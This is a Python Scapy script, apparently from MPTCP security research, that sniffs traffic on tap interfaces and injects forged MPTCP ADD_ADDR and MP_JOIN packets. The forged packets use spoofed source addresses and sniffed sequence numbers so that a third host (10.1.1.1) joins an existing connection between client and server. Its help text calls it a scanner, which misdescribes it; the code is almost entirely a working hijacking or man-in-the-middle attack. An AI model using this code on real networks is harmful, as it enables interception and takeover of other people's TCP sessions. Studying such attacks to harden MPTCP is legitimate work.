#Author: fabriziodemaria#

import logging
import threading
import sys
from random import randint

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *
from subprocess import check_output as execCommand
from sniff_script import *


ADDRESS_ID = 6
SYN_TRANSMITTED = 12
MY_IP = "10.1.1.1"


class SYNThread (threading.Thread):
    def __init__(self, threadID, name, counter, serverIP, clientIP):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.serverIP = serverIP
        self.clientIP = clientIP
    def run(self):
        sniff_SYN(self.serverIP, self.clientIP)


class SYNACKThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        sniff_SYNACK()


def generateAddAddr(srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=MY_IP))]))
    return pkt


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Network scanner to test hosts for multipath TCP support. Requires root privileges for scapy.')
    parser.add_argument('serverIP', action='store', help='Source IP address')
    parser.add_argument('clientIP', action='store', help='Destination IP address')

    if len(sys.argv)!=3:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    return args


def modify_addr_id(pkt, aid):
    rcv = 0x00000000
    snd = 0x00000000
    bkp = 0L
    modified_options = []
    for opt in pkt[TCP].options:
        if opt.kind == 30:
            for o in opt.mptcp:
                if MPTCP_subtypes[o.subtype] == "MP_JOIN":
                    rcv = o.rcv_token
                    snd = o.snd_nonce
                    bkp = o.backup_flow
                    modified_options.append(TCPOption_MP(mptcp=MPTCP_JoinSYN(
                                        addr_id=aid,
                                        backup_flow=bkp,
                                        rcv_token=rcv,
                                        snd_nonce=snd)))
        else:
            modified_options.append(opt)
    pkt[TCP].options = modified_options
    print "\n+++++++++++++++\nSending Syn\n+++++++++++++++\n"
    # pkt.show()
    return pkt


# def add_add_addr(pkt, addIP):
#     modified_options = []
#     for opt in pkt[TCP].options:
#         if opt.kind == 30:
#             modified_options.append(TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
#                                               adv_addr=addIP)))
#         else:
#             modified_options.append(opt)
#     pkt[TCP].options = modified_options
#     return pkt


def sniff_SYNACK():
    print "Start looking for SYNACK"
    pkt = sniff_first_synack("tap2")
    print "\n+++++++++++++++\nReceived SynAck\n+++++++++++++++\n"
    # pkt.show()
    print "Phase 2 completed"


def sniff_SYN(serverIP, clientIP):
    print "Start looking for SYN"
    pkt = sniff_first_syn("tap0")
    pkt[IP].dst = serverIP
    pkt[IP].src = MY_IP
    pkts = modify_addr_id(pkt, ADDRESS_ID)

    lista = []

    p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, serverIP), count=1)
    pkt2 = p[0]
    add_to_server = generateAddAddr(clientIP, pkt2[TCP].dport, serverIP, pkt2[TCP].sport, (pkt2[TCP].ack), (pkt2[TCP].seq))
    # I need to eliminate the ethernet portion of add_to_server
    add_to_server2 = pkt.copy()
    add_to_server2[IP] = add_to_server[IP]
    add_to_server2[TCP] = add_to_server[TCP]
    lista.append(add_to_server2)

    # Generating SYN to be sent after add_to_server
    for i in range(0, SYN_TRANSMITTED):
        pkt[TCP].sport += randint(10,500)
        lista.append(pkt.copy())

    # Sending ADD and JOIN to server in a row
    sendp(lista, iface="tap2", verbose=2)
    print "Phase 1 completed"


def sniff_start_lambda(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        v1 = int(p.sprintf("%TCP.ack%"))
        v2 = int(p.sprintf("%TCP.seq%"))
        if str == srcIP and v1 > 0 and v2 > 0:
            return True
    return False


def main():
    args = parse_args()

    # p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, args.serverIP), count=1)
    # pkt = p[0]
    # # pkt = add_add_addr(p[0],MY_IP)
    # # pkt.show()
    # # pkt[TCP].seq += 14270000
    # # sendp(pkt, iface="tap2")
    # add_to_server = generateAddAddr(args.clientIP, pkt[TCP].dport, args.serverIP, pkt[TCP].sport, (pkt[TCP].ack), (pkt[TCP].seq))

    thread1 = SYNThread(1, "Syn capturing thread", 1, args.serverIP, args.clientIP)
    thread1.start()
    thread2 = SYNACKThread(1, "SynAck capturing thread", 1)
    thread2.start()
    # st1 = threading.Thread(target=sendAddAddr(args.clientIP, pkt[TCP].sport, args.serverIP, pkt[TCP].dport, (pkt[TCP].seq), (pkt[TCP].ack)-1000*1427, "tap2"))
    # st1.start()
    p = sniff(iface='tap0', lfilter=lambda p: sniff_start_lambda(p, args.clientIP), count=1)
    pkt = p[0]
    send(generateAddAddr(args.serverIP, pkt[TCP].dport, args.clientIP, pkt[TCP].sport, (pkt[TCP].ack), (pkt[TCP].seq)-1000*1427), iface="tap0")

    thread1.join()
    thread2.join()
    return

if __name__ == "__main__":
    main()
